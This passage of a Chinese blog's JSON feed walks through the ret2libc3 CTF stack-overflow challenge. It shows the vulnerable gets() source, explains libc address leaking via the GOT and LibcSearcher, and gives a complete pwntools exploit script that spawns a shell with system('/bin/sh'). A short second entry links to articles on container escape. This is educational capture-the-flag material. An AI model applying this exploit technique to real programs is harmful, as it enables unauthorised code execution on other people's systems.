class=\"hljs-attr\">Arch:</span>     <span class=\"hljs-string\">i386-32-little</span><br>    <span class=\"hljs-attr\">RELRO:</span>    <span class=\"hljs-string\">Partial</span> <span class=\"hljs-string\">RELRO</span><br>    <span class=\"hljs-attr\">Stack:</span>    <span class=\"hljs-literal\">No</span> <span class=\"hljs-string\">canary</span> <span class=\"hljs-string\">found</span><br>    <span class=\"hljs-attr\">NX:</span>       <span class=\"hljs-string\">NX</span> <span class=\"hljs-string\">enabled</span><br>    <span class=\"hljs-attr\">PIE:</span>      <span class=\"hljs-literal\">No</span> <span class=\"hljs-string\">PIE</span> <span class=\"hljs-string\">(0x8048000)</span><br></code></pre></td></tr></tbody></table></figure>\n\n<p>可以看出，源程序仍旧开启了堆栈不可执行保护。进而查看源码，发现程序的 bug 仍然是栈溢出</p>\n<figure class=\"highlight cpp\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs cpp\"><span class=\"hljs-function\"><span class=\"hljs-type\">int</span> __cdecl <span class=\"hljs-title\">main</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> argc, <span class=\"hljs-type\">const</span> <span class=\"hljs-type\">char</span> **argv, <span class=\"hljs-type\">const</span> <span class=\"hljs-type\">char</span> **envp)</span></span><br><span class=\"hljs-function\"></span>{<br>  <span class=\"hljs-type\">int</span> v4; <span class=\"hljs-comment\">// [sp+1Ch] [bp-64h]@1</span><br><br>  <span class=\"hljs-built_in\">setvbuf</span>(stdout, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">2</span>, <span class=\"hljs-number\">0</span>);<br>  <span class=\"hljs-built_in\">setvbuf</span>(stdin, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">0</span>);<br>  <span class=\"hljs-built_in\">puts</span>(<span class=\"hljs-string\">\"No surprise anymore, system disappeard QQ.\"</span>);<br>  <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"Can you find it !?\"</span>);<br>  <span class=\"hljs-built_in\">gets</span>((<span class=\"hljs-type\">char</span> *)&amp;v4);<br>  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure>\n\n<p>那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点</p>\n<ul>\n<li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li>\n<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下</li>\n<li><a href=\"https://github.com/niklasb/libc-database\">https://github.com/niklasb/libc-database</a></li>\n</ul>\n<p>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。</p>\n<p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p>\n<p>我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme</p>\n<ul>\n<li><a href=\"https://github.com/lieanu/LibcSearcher\">https://github.com/lieanu/LibcSearcher</a></li>\n</ul>\n<p>此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。</p>\n<p>这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下</p>\n<ul>\n<li>泄露 __libc_start_main 地址</li>\n<li>获取 libc 版本</li>\n<li>获取 system 地址与 /bin/sh 的地址</li>\n<li>再次执行源程序</li>\n<li>触发栈溢出执行 system(‘/bin/sh’)</li>\n</ul>\n<p>exp 如下</p>\n<figure class=\"highlight gradle\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs gradle\">#!<span class=\"hljs-regexp\">/usr/</span>bin/env python<br><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br><span class=\"hljs-keyword\">from</span> LibcSearcher <span class=\"hljs-keyword\">import</span> LibcSearcher<br>sh = process(<span class=\"hljs-string\">'./ret2libc3'</span>)<br><br>ret2libc3 = ELF(<span class=\"hljs-string\">'./ret2libc3'</span>)<br><br>puts_plt = ret2libc3.plt[<span class=\"hljs-string\">'puts'</span>]<br>libc_start_main_got = ret2libc3.got[<span class=\"hljs-string\">'__libc_start_main'</span>]<br>main = ret2libc3.symbols[<span class=\"hljs-string\">'main'</span>]<br><br><span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">\"leak libc_start_main_got addr and return to main again\"</span><br>payload = flat([<span class=\"hljs-string\">'A'</span> * <span class=\"hljs-number\">112</span>, puts_plt, main, libc_start_main_got])<br>sh.sendlineafter(<span class=\"hljs-string\">'Can you find it !?'</span>, payload)<br><br><span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">\"get the related addr\"</span><br>libc_start_main_addr = u32(sh.recv()[<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">4</span>])<br>libc = LibcSearcher(<span class=\"hljs-string\">'__libc_start_main'</span>, libc_start_main_addr)<br>libcbase = libc_start_main_addr - libc.<span class=\"hljs-keyword\">dump</span>(<span class=\"hljs-string\">'__libc_start_main'</span>)<br>system_addr = libcbase + libc.<span class=\"hljs-keyword\">dump</span>(<span class=\"hljs-string\">'system'</span>)<br>binsh_addr = libcbase + libc.<span class=\"hljs-keyword\">dump</span>(<span class=\"hljs-string\">'str_bin_sh'</span>)<br><br><span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">\"get shell\"</span><br>payload = flat([<span class=\"hljs-string\">'A'</span> * <span class=\"hljs-number\">104</span>, system_addr, <span class=\"hljs-number\">0</span>xdeadbeef, binsh_addr])<br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"题目-¶-2\"><a href=\"#题目-¶-2\" class=\"headerlink\" title=\"题目 ¶\"></a>题目 <a href=\"https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_11\">¶</a></h3><ul>\n<li>train.cs.nctu.edu.tw: ret2libc</li>\n</ul>\n",
            "tags": [
                "pwn",
                "stack overflow"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/02/28/xu-ni-hua-an-quan/",
            "url": "https://alazymechnaic.github.io/2023/02/28/xu-ni-hua-an-quan/",
            "title": "虚拟化安全",
            "date_published": "2023-02-28T09:36:50.000Z",
            "content_html": "<p>综述: <a href=\"https://tech.meituan.com/2020/03/12/cloud-native-security.html\">https://tech.meituan.com/2020/03/12/cloud-native-security.html</a></p>\n<p>容器逃逸实战： <a href=\"https://static.anquanke.com/download/b/security-geek-2019-q4/article-8.html\">https://static.anquanke.com/download/b/security-geek-2019-q4/article-8.html</a></p>\n<p>虚拟化有几种方式</p>\n",
            "tags": []
        }
    ]
}